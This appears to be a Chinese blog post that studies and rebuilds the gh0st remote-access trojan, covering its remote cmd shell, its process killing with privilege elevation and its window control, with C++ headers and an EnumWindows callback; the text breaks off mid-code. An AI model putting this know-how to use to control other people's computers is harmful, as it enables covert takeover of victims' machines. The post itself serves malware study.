<h2 id="part5-终端管理"><a href="#part5-终端管理" class="headerlink" title="part5-终端管理"></a>part5-终端管理</h2><p>之前学习过如何实现远程cmd，<a target="_blank" rel="noopener" href="https://the_itach1.gitee.io/2022/01/31/Windows-Hack-Programming/">https://the_itach1.gitee.io/2022/01/31/Windows-Hack-Programming/</a>，但实际上很不健全。</p>
<h3 id="客户端代码"><a href="#客户端代码" class="headerlink" title="客户端代码"></a>客户端代码</h3><p>即为ShellManager.cpp。</p>
<p>其内部实际上就是创建了管道和cmd.exe进程，来进行命令的执行和读取。当然包括了发送信息和接收信息的处理函数。</p>
<p>和之前学习的cmd有点不同，这个里面有两个管道，实际上也不难理解，之前我写的远程cmd的输入命令是设置好的，所以只需要输出管道就行，但是这个的输入命令是由控制客户端传入的，所以还需要一个输入管道。</p>
<h3 id="控制服务端代码"><a href="#控制服务端代码" class="headerlink" title="控制服务端代码"></a>控制服务端代码</h3><p>即为CShellDlg.cpp。</p>
<p>其本质是个带有EDIT控件的对话框，EDIT控件就是用来展示终端的，这个类中也包含了读取消息和发送消息的两个函数。</p>
<h3 id="传输过程"><a href="#传输过程" class="headerlink" title="传输过程"></a>传输过程</h3><p>这里直接一步步更整个终端管理的传输过程吧。</p>
<ul>
<li>客户机上线，会向服务端发送上线机的信息，并创建ClientSocket变量和CKernelManager变量，并使用setManagerCallBack将创建的ClientSocket变量的m_pManager成员设置为CKernelManager，这就意味着后面调用OnReceive函数将是调用CKernelManager的OnReceive处理。</li>
<li>控制服务端点击终端管理，触发菜单栏OnOnlineCmd处理函数，调用SendSelectCommand函数，向客户机发送了COMMAND_SHELL这个消息以及发送了存储着上线客户机的信息的结构体pContext。</li>
<li>客户端在链接到控制服务端后会创建一个WorkThread的线程，然后进行接收服务端发过来的数据，调用Onread函数。</li>
<li>然后Onread函数中，在解压数据等操作后，会调用Manager-&gt;OnReceive()函数，这个函数实际上是Manager里面的一个虚函数，只有在其子类中才有具体实现，也就是多态，根据第一步的操作，我们知道他将会调用CKernelManager的OnReceive函数处理。</li>
<li>在CKernelManager的OnReceive函数中，我们实际上可以看到很多switch case，分别对应着控制服务端的各种功能，终端管理接收的消息就是COMMAND_SHELL，然后就会创建一个对应功能的线程，来处理。</li>
<li>终端管理线程的函数是Loop_ShellManager，查看其内部，可以看到先是链接了控制服务端，然后创建了CShellManager这个类变量，创建时，会调用Manager的构造函数，m_pClient-&gt;setManagerCallBack(this);，所以这时候接收消息的函数就变成了CShellManager类中的OnReceive()，CShellManager这个类就是实现终端管理功能的具体实现。</li>
<li>CShellManager的构造函数，创建管道，创建cmd进程，然后向控制服务端发送TOKEN_SHELL_START消息，表示准备完毕，然后等待控制端的处理，控制端的终端管理对话框是否准备完毕。</li>
<li>控制服务端的NotifyProc函数接收到消息后，调用ProcessReceiveComplete函数，先进行判断功能对应的对话框是否开启，然后进入下面的case判断，进入TOKEN_SHELL_START，会发送一个自定义的消息，触发相应的消息处理函数OnOpenShellDialog，创建了我们的CShellDlg类变量，并且对pContext的m_Dialog付了值，代表控制端的终端对话框已经准备就绪。</li>
<li>我们进入CShellDlg的具体实现，看看其构造函数和初始化函数，构造函数就是初始化pIOCPServer和pContext，初始化函数中会向客户端发送一个COMMAND_NEXT消息。</li>
<li>CShellManager类中的OnReceive()会接收到这个消息(经过WorkThread中的处理不变)，然后设置m_hEventDlgOpen事件，代表控制服务端的对话框准备就绪，WaitForDialogOpen()调用成功。</li>
<li>然后创建两个线程，一个是读取管道数据，一个是等待管道关闭线程。</li>
<li>ReadPipeThread线程会判断当前管道是否有消息，有就会读取管道消息，然后发送给控制服务端。</li>
<li>经过控制服务端的ProcessReceiveComplete后，因为终端管理对话框已经打开，所以pContext-&gt;m_Dialog[0]里面是有值的，case找到对应的功能对话框，然后调用起处理函数，这里是OnReceiveComplete。</li>
<li>OnReceiveComplete调用AddKeyBoardData，将传入的字符串进行处理显示在EDIT控件中。</li>
</ul>
<p>上面的过程就是终端管理整个初始化的过程了，还是非常复杂，但是十分健全。</p>
<p>下面来讲解如何执行命令。</p>
<ul>
<li>因为发送终端命令都需要一个换行符，所以我们可以通过截取键盘消息的方式来实现，CDialog提供了一个虚函数PreTranslateMessage，可以来作为截取键盘，我们在CShellDlg中对这个虚函数进行重载。</li>
<li>需要对特定消息进行截取，然后采取不同措施，例如如果是回车键，就发送命令，如果是回退键，判断当前编辑字符串长度超过了之前命令的长度，然后采取不同措施。</li>
<li>发送命令后，客户端的OnReceive接收到命令字符串，写入管道，cmd.exe就会执行命令，产生的回显会输出到输出管道。</li>
<li>ReadPipeThread线程会判断当前管道是否有消息，有就会读取管道消息，然后发送给控制服务端。</li>
</ul>
<p>当然实际上还有很多细节的地方，比如说对传输数据的处理，就不过多阐述。</p>
<h3 id="精彩代码"><a href="#精彩代码" class="headerlink" title="精彩代码"></a>精彩代码</h3><p>我们控制端的编辑窗口和cmd控制台一模一样，得益于其代码的完整，对接收到数据的处理，以及对我们的输入，都有严格的处理。</p>
<h2 id="part6-进程管理"><a href="#part6-进程管理" class="headerlink" title="part6-进程管理"></a>part6-进程管理</h2><p>教程里面是将进程管理和窗口管理的客户端类和控制服务端的对话框类写在了两个cpp中，但是个人感觉分开写两个功能会更好，于是将其分开了。</p>
<h3 id="进程监控原理"><a href="#进程监控原理" class="headerlink" title="进程监控原理"></a>进程监控原理</h3><p>就是通过<a target="_blank" rel="noopener" href="https://the_itach1.gitee.io/2022/01/31/Windows-Hack-Programming/">https://the_itach1.gitee.io/2022/01/31/Windows-Hack-Programming/</a>中的进程遍历，当然gh0st中的代码更加完善，健全。</p>
<h3 id="客户端CProcessManager-cpp"><a href="#客户端CProcessManager-cpp" class="headerlink" title="客户端CProcessManager.cpp"></a>客户端CProcessManager.cpp</h3><p>这个类就是用来监视进程的，其中.h文件如下，具体实现就是自己分析代码了。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// CProcessManager.h: interface for the CProcessManager class.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _MSC_VER &gt; 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// _MSC_VER &gt; 1000</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Manager.h&quot;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CProcessManager</span> :</span> <span class="keyword">public</span> CManager</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		CProcessManager(CClientSocket* pClient, BYTE bHow);<span class="comment">//bHow是传进来功能的标志</span></span><br><span class="line">		<span class="keyword">virtual</span> ~CProcessManager();</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">OnReceive</span><span class="params">(LPBYTE lpBuffer, UINT nSize)</span></span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//提权</span></span><br><span class="line">		<span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">DebugPrivilege</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* PName, BOOL bEnable)</span></span>;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		BYTE m_caseSystemIs;<span class="comment">//构造函数会初始化这个变量，用于区分进程或者窗口的变量</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//获取进程的完整路径</span></span><br><span class="line">		<span class="function">BOOL <span class="title">GetProcessFullPath</span><span class="params">(DWORD dwPID, TCHAR pszFullPath[MAX_PATH])</span></span>;</span><br><span class="line">		<span class="function">BOOL <span class="title">DosPathToNtPath</span><span class="params">(LPTSTR pszDosPath, LPTSTR pszNtPath)</span></span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//遍历进程，获取进程的数据写入申请的内存空间</span></span><br><span class="line">		<span class="function">LPBYTE <span class="title">getProcessList</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="comment">//发送获取的进程数据到控制服务端</span></span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">SendProcessList</span><span class="params">()</span></span>;;</span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">SendDialupassList</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//根据pid来杀死进程</span></span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">KillProcess</span><span class="params">(LPBYTE lpBuffer, UINT nSize)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="控制服务端CProcessDlg-cpp"><a href="#控制服务端CProcessDlg-cpp" class="headerlink" title="控制服务端CProcessDlg.cpp"></a>控制服务端CProcessDlg.cpp</h3><p>一个处理进程信息的对话框，包含了一个list控件和菜单。</p>
<p>.h文件如下。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;afxcmn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;include/IOCPServer.h&quot;</span></span></span><br><span class="line"><span class="comment">// CProcessDlg 对话框</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CProcessDlg</span> :</span> <span class="keyword">public</span> CDialog</span><br><span class="line">&#123;</span><br><span class="line">	DECLARE_DYNAMIC(CProcessDlg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CProcessDlg(CWnd* pParent = <span class="literal">NULL</span>, CIOCPServer* pIOCPServer = <span class="literal">NULL</span>, ClientContext* pContext = <span class="literal">NULL</span>);   <span class="comment">// 标准构造函数</span></span><br><span class="line">	<span class="keyword">virtual</span> ~CProcessDlg();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对话框数据</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> AFX_DESIGN_TIME</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> &#123;</span> IDD = IDD_PROCESS &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span>;    <span class="comment">// DDX/DDV 支持</span></span><br><span class="line"></span><br><span class="line">	DECLARE_MESSAGE_MAP()</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CListCtrl m_list_process;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	HICON m_hIcon;</span><br><span class="line">	ClientContext* m_pContext;</span><br><span class="line">	CIOCPServer* m_iocpServer;</span><br><span class="line">	BOOL m_bHow;     <span class="comment">//用来区分窗口管理和进程管理</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnClose</span><span class="params">()</span></span>;	<span class="comment">//关闭对话框后的处理函数</span></span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnSize</span><span class="params">(UINT nType, <span class="keyword">int</span> cx, <span class="keyword">int</span> cy)</span></span>;	<span class="comment">//让list控件的大小随对话框的变动而变动</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> BOOL <span class="title">OnInitDialog</span><span class="params">()</span></span>;	<span class="comment">//初始化对话框</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">ShowProcessList</span><span class="params">(<span class="keyword">void</span>)</span></span>;	<span class="comment">//将接收到的数据显现在list中</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">AdjustList</span><span class="params">()</span></span>;	<span class="comment">//调整list控件位置</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">OnReceiveComplete</span><span class="params">(<span class="keyword">void</span>)</span></span>;	<span class="comment">//接收消息的函数</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">GetProcessList</span><span class="params">(<span class="keyword">void</span>)</span></span>;	<span class="comment">//想客户端发送获取进程数据的命令</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnNMRClickListProcess</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span>;	<span class="comment">//弹出菜单</span></span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnProcessKill</span><span class="params">()</span></span>;	<span class="comment">//杀死某一进程</span></span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnProcessRefresh</span><span class="params">()</span></span>; <span class="comment">//刷新</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="数据传输过程"><a href="#数据传输过程" class="headerlink" title="数据传输过程"></a>数据传输过程</h3><p>还是来理一遍数据的传输过程，之前在shell管理已经讲过部分传输过程，所以下面某些过程会略讲。</p>
<ul>
<li>肉鸡上线后，我们点击进程管理，进入OnOnlineProcess()，然后，调用SendSelectCommand()，发送COMMAND_PROCESS到客户端。</li>
<li>客户端OnReceive接收到消息，创建Loop_ProcessManager线程，创建一个CClientSocket，连接控制服务端，然后创建一个CProcessManager类。</li>
<li>进入CProcessManager类的构造函数，判断接收的命令是COMMAND_PROCESS，调用SendProcessList()函数。</li>
<li>SendProcessList()中，调用getProcessList()获取了数据，其过程中会写上数据头TOKEN_PSLIST，然后发送给控制服务端。</li>
<li>控制服务端ProcessReceiveComplete()接收到消息，先判断Process管理的对话框是否打开，现在肯定没有打开，就会触发下面的case TOKEN_PSLIST，从而触发自定义消息函数OnOpenProcessDialog，打开进程管理的对话框。</li>
<li>进入对话框的初始化过程，大概就是初始化一些变量，设置标题，图标，然后初始化list控件，然后调用ShowProcessList()在list控件中展示进程数据。</li>
</ul>
<p>上面的过程就是进程管理的初始化过程，下面来讲解控制服务端发送刷新命令的数据传输过程。</p>
<ul>
<li>控制服务端调用OnProcessRefresh()消息函数，其先判断lsit控件是否存在，然后调用GetProcessList()函数。</li>
<li>GetProcessList()函数向客户端发送COMMAND_PSLIST命令。</li>
<li>客户端的OnReceive()函数接收到COMMAND_PSLIST，调用SendProcessList()函数</li>
<li> SendProcessList()中，调用getProcessList()获取了数据，其过程中会写上数据头TOKEN_PSLIST，然后发送给控制服务端。</li>
<li>控制服务端ProcessReceiveComplete()接收到消息，这时进程对话框已经打开，所以会调用CProcessDlg的OnReceiveComplete函数，然后case TOKEN_PSLIST，调用ShowProcessList()展示数据。</li>
</ul>
<p>杀死进程的过程</p>
<ul>
<li>调用OnProcessKill()，根据选中的行号得到选中一个或多个进程的pid信息，写上COMMAND_KILLPROCESS，发送给客户端。</li>
<li>客户端的OnReceive()函数接收到COMMAND_KILLPROCESS，进行提权，然后根据pid杀死进程，然后调用SendProcessList()函数。</li>
<li>调用SendProcessList()函数就会刷新控制服务端的对话框的list控件了。</li>
</ul>
<h2 id="part7-窗口管理"><a href="#part7-窗口管理" class="headerlink" title="part7-窗口管理"></a>part7-窗口管理</h2><p>其功能由CWindowsManager.cpp和CWindowsDlg.cpp两个文件实现。实际上其数据传输过程，包括对话框的设计和菜单的实现都和进程管理差不多，但是在获取窗口数据和一些菜单功能的实现代码还是和进程管理有很大的差别。</p>
<h3 id="窗口管理原理"><a href="#窗口管理原理" class="headerlink" title="窗口管理原理"></a>窗口管理原理</h3><p>其获取窗口的数据主要是靠EnumWindows，一直枚举顶层窗口，我们需要设置一个回调函数EnumWindowsProc来获取枚举的窗口的一些信息，主要是窗口标题和PID和其显示状态。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//窗口回调遍历所有窗口</span></span><br><span class="line">	<span class="function"><span class="keyword">bool</span> CALLBACK <span class="title">CWindowsManager::EnumWindowsProc</span><span class="params">(HWND hwnd, LPARAM lParam)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		DWORD	dwLength = <span class="number">0</span>;</span><br><span class="line">		DWORD	dwOffset = <span class="number">0</span>;</span><br><span class="line">		DWORD	dwProcessID = <span class="number">0</span>;</span><br><span class="line">		LPBYTE	lpBuffer = *(LPBYTE*)lParam;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">char</span>	strTitle[<span class="number">1024</span>];</span><br><span class="line">		<span class="built_in">memset</span>(strTitle, <span class="number">0</span>, <span class="keyword">sizeof</span>(strTitle));</span><br><span class="line">		<span class="comment">//获取传进来的窗口句柄的标题</span></span><br><span class="line">		<span class="keyword">if</span> (IsWindowVisible(hwnd))</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="comment">//GetWindowText(hwnd, strTitle, sizeof(strTitle));</span></span><br><span class="line">		GetWindowTextSafe(hwnd, strTitle, <span class="keyword">sizeof</span>(strTitle));</span><br><span class="line">		<span class="comment">//判断窗口是否可见，标题是否为空</span></span><br><span class="line">		<span class="keyword">if</span> (lstrlen(strTitle) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			OutputDebugString(<span class="string">&quot;lstrlen&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">		<span class="comment">//如果指针为空的话申请一个堆</span></span><br><span class="line">		<span class="comment">//（该函数时循环的所以第二次进来就不是空的，用动态的LocalReAlloc改变堆大小实现数据都在一个堆上）</span></span><br><span class="line">		<span class="keyword">if</span> (lpBuffer == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="comment">//第一次申请大小为1是因为第一字节为通知控制端标识</span></span><br><span class="line">			lpBuffer = (LPBYTE)LocalAlloc(LPTR, <span class="number">1</span>);</span><br><span class="line">	</span><br><span class="line">		dwLength = <span class="keyword">sizeof</span>(DWORD) + lstrlen(strTitle) + <span class="number">1</span>;</span><br><span class="line">		dwOffset = LocalSize(lpBuffer);</span><br><span class="line">	</span><br><span class="line">		<span class="comment">//计算缓冲区大小</span></span><br><span class="line">		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT | LMEM_MOVEABLE);</span><br><span class="line">	</span><br><span class="line">		<span class="comment">//获取窗口的创建者 + 两个memcpy数据结构为 创建者PID + hwnd + 窗口标题 + 0</span></span><br><span class="line">		GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));</span><br><span class="line">		<span class="built_in">memcpy</span>((lpBuffer + dwOffset), &amp;hwnd, <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">		<span class="built_in">memcpy</span>(lpBuffer + dwOffset + <span class="keyword">sizeof</span>(DWORD), strTitle, lstrlen(strTitle) + <span class="number">1</span>);</span><br><span class="line">	</span><br><span class="line">		*(LPBYTE*)lParam = lpBuffer;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>然后在来看看其如何实现的关闭，显示，最大化，最小化窗口。</p>
<pre><code>关闭，先提权，然后

PostMessage((HWND__*)hwnd, WM_CLOSE, 0, 0);

显示，最大化，最小化

主要是看控制服务端传过来的第二个参数是什么
ShowWindow((HWND__*)hwnd, dHow);</code></pre>
<h3 id="控制服务端CWindowsDlg-cpp"><a href="#控制服务端CWindowsDlg-cpp" class="headerlink" title="控制服务端CWindowsDlg.cpp"></a>控制服务端CWindowsDlg.cpp</h3><p>其.h文件如下。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;afxcmn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;include/IOCPServer.h&quot;</span></span></span><br><span class="line"><span class="comment">// CWindowsDlg 对话框</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CWindowsDlg</span> :</span> <span class="keyword">public</span> CDialog</span><br><span class="line">&#123;</span><br><span class="line">	DECLARE_DYNAMIC(CWindowsDlg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CWindowsDlg(CWnd* pParent = <span class="literal">NULL</span>, CIOCPServer* pIOCPServer = <span class="literal">NULL</span>, ClientContext* pContext = <span class="literal">NULL</span>);   <span class="comment">// 标准构造函数</span></span><br><span class="line">	<span class="keyword">virtual</span> ~CWindowsDlg();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对话框数据</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> AFX_DESIGN_TIME</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> &#123;</span> IDD = IDD_WINDOWS &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span>;    <span class="comment">// DDX/DDV 支持</span></span><br><span class="line"></span><br><span class="line">	DECLARE_MESSAGE_MAP()</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CListCtrl m_list_windows;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	HICON m_hIcon;</span><br><span class="line">	ClientContext* m_pContext;</span><br><span class="line">	CIOCPServer* m_iocpServer;</span><br><span class="line">	BOOL m_bHow;     <span class="comment">//用来区分窗口管理和进程管理</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnClose</span><span class="params">()</span></span>;		<span class="comment">//关闭对话框消息处理函数</span></span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnSize</span><span class="params">(UINT nType, <span class="keyword">int</span> cx, <span class="keyword">int</span> cy)</span></span>;	<span class="comment">//对话框大小变换</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">AdjustList</span><span class="params">(<span class="keyword">void</span>)</span></span>;	<span class="comment">//调整list控件大小</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> BOOL <span class="title">OnInitDialog</span><span class="params">()</span></span>;	<span class="comment">//对话框初始化函数</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">OnReceiveComplete</span><span class="params">(<span class="keyword">void</span>)</span></span>;	<span class="comment">//数据接收函数</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">ShowWindowsList</span><span class="params">(<span class="keyword">void</span>)</span></span>;		<span class="comment">//将接收到的窗口数据展示在list中。</span></span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnNMRClickListWindows</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span>;	<span class="comment">//右键弹出菜单</span></span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnWindowsClose</span><span class="params">()</span></span>;	<span class="comment">//窗口关闭处理函数</span></span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnWindowsHide</span><span class="params">()</span></span>;	<span class="comment">//隐藏窗口</span></span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnWindowsMax</span><span class="params">()</span></span>;	<span class="comment">//最大化窗口</span></span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnWindowsMin</span><span class="params">()</span></span>;	<span class="comment">//最小化窗口</span></span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnWindowsReturn</span><span class="params">()</span></span>;	<span class="comment">//还原显示窗口</span></span><br><span class="line">	<span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnWindowsReflush</span><span class="params">()</span></span>;	<span class="comment">//刷新整个列表</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">GetWindowsList</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="客户端CWindowsManager-cpp"><a href="#客户端CWindowsManager-cpp" class="headerlink" title="客户端CWindowsManager.cpp"></a>客户端CWindowsManager.cpp</h3><p>其.h文件入下。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// CProcessManager.h: interface for the CProcessManager class.</span></span><br><span class="line"><span 